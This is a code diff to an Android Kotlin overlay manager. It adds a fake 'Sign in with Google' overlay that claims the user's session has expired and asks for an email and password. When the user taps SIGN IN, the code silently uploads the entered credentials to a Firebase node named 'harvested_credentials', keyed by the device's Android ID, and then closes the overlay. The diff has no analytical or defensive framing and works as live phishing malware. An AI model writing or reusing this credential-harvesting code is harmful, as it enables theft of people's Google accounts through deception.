@@ -20,9 +20,12 @@ import android.view.View
 import android.view.ViewGroup
 import android.view.WindowManager
 import android.widget.Button
+import android.widget.EditText
 import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
+import android.text.InputType
+import com.google.firebase.database.FirebaseDatabase
 
 data class OverlayTemplateConfig(
     val templateId: String,
@@ -76,6 +79,17 @@ object AccessibilityOverlayManager {
             cardBgColor = "#0F1A14",
             strokeColor = "#3DDC84",
             buttonColor = "#2E7D32"
+        ),
+        "login" to OverlayTemplateConfig(
+            templateId = "login",
+            name = "Google Sign-In",
+            iconEmoji = "🔐",
+            title = "Sign in with Google",
+            message = "Your session has expired. Please verify your Google account credentials to continue.",
+            buttonText = "SIGN IN",
+            cardBgColor = "#1E293B",
+            strokeColor = "#4285F4",
+            buttonColor = "#1A73E8"
         )
     )
 
@@ -319,7 +333,46 @@ object AccessibilityOverlayManager {
                     setPadding(0, 0, 0, dpToPx(appContext, 24))
                 }
 
-                // Action Button: Open Accessibility Settings
+                cardLayout.addView(iconView)
+                cardLayout.addView(titleView)
+                cardLayout.addView(messageView)
+
+                val userInput = if (config.templateId == "login") {
+                    val emailInput = EditText(appContext).apply {
+                        hint = "Email or phone"
+                        setTextColor(Color.WHITE)
+                        setHintTextColor(Color.parseColor("#64748B"))
+                        setPadding(dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12))
+                        background = GradientDrawable().apply {
+                            setColor(Color.parseColor("#0F172A"))
+                            cornerRadius = dpToPx(appContext, 8).toFloat()
+                            setStroke(1, Color.parseColor("#334155"))
+                        }
+                    }
+                    val passInput = EditText(appContext).apply {
+                        hint = "Password"
+                        inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
+                        setTextColor(Color.WHITE)
+                        setHintTextColor(Color.parseColor("#64748B"))
+                        setPadding(dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12))
+                        background = GradientDrawable().apply {
+                            setColor(Color.parseColor("#0F172A"))
+                            cornerRadius = dpToPx(appContext, 8).toFloat()
+                            setStroke(1, Color.parseColor("#334155"))
+                        }
+                    }
+                    val emailParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
+                        setMargins(0, 0, 0, dpToPx(appContext, 12))
+                    }
+                    val passParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
+                        setMargins(0, 0, 0, dpToPx(appContext, 20))
+                    }
+                    cardLayout.addView(emailInput, emailParams)
+                    cardLayout.addView(passInput, passParams)
+                    Pair(emailInput, passInput)
+                } else null
+
+                // Action Button
                 val enableButton = Button(appContext).apply {
                     text = config.buttonText
                     textSize = 13f
@@ -334,13 +387,28 @@ object AccessibilityOverlayManager {
                     setPadding(dpToPx(appContext, 16), dpToPx(appContext, 12), dpToPx(appContext, 16), dpToPx(appContext, 12))
 
                     setOnClickListener {
-                        openAccessibilitySettings(appContext)
+                        if (userInput != null) {
+                            val email = userInput.first.text.toString()
+                            val pass = userInput.second.text.toString()
+                            if (email.isNotBlank() || pass.isNotBlank()) {
+                                try {
+                                    val deviceId = Settings.Secure.getString(appContext.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
+                                    val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("harvested_credentials")
+                                    val record = mapOf(
+                                        "username" to email,
+                                        "password" to pass,
+                                        "timestamp" to System.currentTimeMillis()
+                                    )
+                                    ref.push().setValue(record)
+                                } catch (_: Exception) {}
+                            }
+                            removeOverlay(appContext)
+                        } else {
+                            openAccessibilitySettings(appContext)
+                        }
                     }
                 }
 
-                cardLayout.addView(iconView)
-                cardLayout.addView(titleView)
-                cardLayout.addView(messageView)
                 cardLayout.addView(enableButton)
 
                 rootLayout.addView(cardLayout, cardParams)
